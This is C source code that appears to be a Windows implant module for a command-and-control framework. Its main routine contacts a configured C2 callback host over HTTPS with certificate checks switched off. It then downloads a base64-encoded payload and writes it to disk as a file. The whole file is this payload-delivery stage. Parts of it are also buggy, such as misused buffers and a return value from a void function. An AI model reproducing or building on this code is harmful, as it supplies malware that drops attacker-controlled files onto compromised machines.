#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>

#include "settings.h"

static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

static char encoding_table[] = {
                                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'
                                };

size_t b64_decoded_size(const char *in)
{
	size_t len;
	size_t ret;
	size_t i;

	if (in == NULL)
		return 0;

	len = strlen(in);
	ret = len / 4 * 3;

	for (i=len; i-->0; ) {
		if (in[i] == '=') {
			ret--;
		} else {
			break;
		}
	}

	return ret;
}


void build_decoding_table() {
 
    decoding_table = malloc(256);
 
    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}

unsigned char *base64_decode(const char *data, size_t input_length, size_t *output_length) {
 
    if (decoding_table == NULL) build_decoding_table();
 
    if (input_length % 4 != 0) return NULL;
 
    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;
 
    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;
 
    for (int i = 0, j = 0; i < input_length;) {
 
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
 
        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);
 
        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }
 
    return decoded_data;
}

void main()
{
    char*     b64_out;
    FILE*     write_ptr;
    LPCWSTR*  ResBuffer;
    LPCSTR    Cwd, Path;
    DWORD     BufferSize;
    LPCWSTR   ReqBuffer[MAX_PATH * 3];
    HINTERNET hSession, hConnect, hRequest = NULL;

    // initiate the winhttp session
    hSession = WinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // check if we failed
    if (!hSession)
    {
        // let the user know we failed
        printf("ERROR: WinHttpOpen, code: %d\n", GetLastError());
        return;
    }

    // make the connection
    hConnect = WinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);

        printf("ERROR: WinHttpConnect, code: %d\n", GetLastError());
        return;
    }

    // setup the request
    hRequest = WinHttpOpenRequest(hConnect, L"POST", _C2CALLBACK_URI, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {

        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        printf("ERROR: WinHttpOpenRequest, code: %d\n", GetLastError());
        return;
    }

    // lets ignore invalid certs
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);

        printf("ERROR: WinHttpSetOption, code: %d\n", GetLastError());
        return FALSE;
    }

    // set up the buffer
    memset(ReqBuffer, '\0', strlen(ReqBuffer));
    sprintf(ReqBuffer, "{\"id\":\"%s\", \"opcode\":%d}", SESSION_ID, DO_CALLBACK);

    // send the request to get the file from the c2
    BOOL bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)ReqBuffer, strlen((char*)ReqBuffer), strlen((char*)ReqBuffer), 0);

    // check if the request was successful
    if (bResults)
    {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        LPSTR pszOutBuffer;

        BufferSize = 1000;
        ResBuffer  = malloc(BufferSize);

        do
        {
            // check how much available data there is

            dwSize = 0;
            if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                printf( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }

            // out of data

            if (!dwSize)
            {
                break;
            }

            // allocate space for the buffer

            pszOutBuffer = (LPSTR)malloc(dwSize+1);

            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                free(pszOutBuffer);

                break;
            }

            // read all the data

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
            {
                // been an error
                free(pszOutBuffer);

                return FALSE;
            }
            else
            {
                if ((strlen(ResBuffer) + strlen(pszOutBuffer)) > BufferSize)
                {
                    ResBuffer = realloc(ResBuffer, (strlen(ResBuffer) + strlen(pszOutBuffer)));
                }

                asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
            }

            // free the memory allocated to the buffer.
            free(pszOutBuffer);

        } while (dwSize > 0);
    }

    size_t out_len   = strlen(ResBuffer) + 1;
    size_t b64_len   = b64_decoded_size(ResBuffer);
    b64_out          = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)ResBuffer, out_len - 1, &out_len);

    // free up the buffer
    free(ResBuffer);

    if (ABS_PATH)
    {
        write_ptr = fopen(FILENAME,"wb");
    } else {

        Cwd = (LPCSTR)malloc(MAX_PATH);
        Path = (LPCSTR)malloc(MAX_PATH + strlen(FILENAME));

        if (GetCurrentDirectory(MAX_PATH, Cwd) == 0)
        {
            printf("ERROR: GetCurrentDirectory, error code: %d\n", GetLastError());
            return;
        }

        sprintf(Path, "%s\\%s", Cwd, FILENAME);
        write_ptr = fopen(Path, "wb");
    }

    fwrite(b64_out, b64_len, 1, write_ptr);

    printf("\033[1;32m[+]\033[0m File Uploaded.\n");

    // free the buffers
    free(Cwd);
    free(Path);
    free(b64_out);

    // clean up the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);

    return;
}